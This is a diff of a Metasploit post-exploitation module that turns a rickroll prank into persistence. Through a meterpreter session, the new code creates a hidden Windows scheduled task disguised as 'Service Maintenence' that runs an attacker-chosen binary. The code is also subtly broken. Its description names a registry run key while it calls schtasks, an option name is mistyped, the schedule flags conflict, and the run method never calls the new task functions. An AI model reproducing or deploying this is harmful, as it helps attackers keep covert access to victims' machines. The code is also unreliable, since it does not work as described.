@@ -18,8 +18,8 @@ class Metasploit3 < Msf::Post
 	
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Annoying Rickroll!',
-				'Description'   => %q{ This module's only purpose is to annoy users :) .},
+				'Name'          => 'Simple Scheduled Task Persistence!',
+				'Description'   => %q{ This module persists a binary via the reg run command  .},
 				'License'       => BSD_LICENSE,
 				'Author'        => [ 'Jonathan Cran <jcran[at]metasploit.com>'],
 				'Version'       => '$Revision$',
@@ -27,14 +27,16 @@ class Metasploit3 < Msf::Post
 				'SessionTypes'  => [ 'meterpreter' ],
 				'References'    =>
 					[
-						[ 'URL', 'http://twitter.com/#!/hdmoore/status/54964008033333248' ]
+						[ 'URL', '' ]
 					]
 			))
 		register_options(
 			[
 				OptBool.new('DISABLE',   [ false, 'Disable it.', false]),
+				OptString.new('TASKNAME', [false, 'Task Name', 'Service Maintenence']),
+				OptString.new('BINARY', [false, 'Binary to schedule', 'C:\\windows\\system32\\svchost.exe']),
+				OptInt.new('INTERVAL', [false, 'How often to run the task (minutes)', 5]),
                                 OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', true]), 
-                                OptBool.new('EVIL', [false, 'Automatically migrate to explorer.exe', false ])
 			], self.class)
 
 	end
@@ -43,35 +45,22 @@ class Metasploit3 < Msf::Post
 		migrate 
 			
 		if datastore['DISABLE']
-			print_status "Disabling rickroll..."
-			if datastore['EVIL']
-				1000.times do |i|
-					disable_annoy("RRLOL",i)
-				end
-			else
-				disable_annoy
-			end
+			print_status "Disabling scheduled task..."
+			
 		else
-			print_status "Enabling rickroll..."
-			if datastore['EVIL']
-				1000.times do |i|
-					enable_annoy("RRLOL",i)
-				end
-			else
-				enable_annoy
-			end
+			print_status "Enabling scheduled task..."
 		end
 	end
 
-	def enable_annoy(name="RRLOL",count=0)
-		task_name = name + count.to_s
-		target = "schtasks.exe /CREATE /TN #{task_name} /TR \"cmd.exe /c start http://bit.ly/idn29F\" /SC ONIDLE /I 1"
+	def enable_task(name=nil,count=0)
+		task_name = datastore["TASKNAME"] unless name
+		target = "schtasks.exe /CREATE /TN #{task_name} /TR \"cmd.exe /c start #{datastore["Binary"]}\" /SC ONEVENT /I #{datastore['INTERVAL']}"
 		print_status "Running #{target}"
 		newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
 	end
 
-	def disable_annoy(name="RRLOL",count=0)
-		task_name = name + count.to_s
+	def disable_task(name=nil,count=0)
+		task_name = datastore["TASKNAME"] unless name
 		target = "schtasks.exe /DELETE /F /TN #{task_name}"
 		print_status "Running #{target}"
 		newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
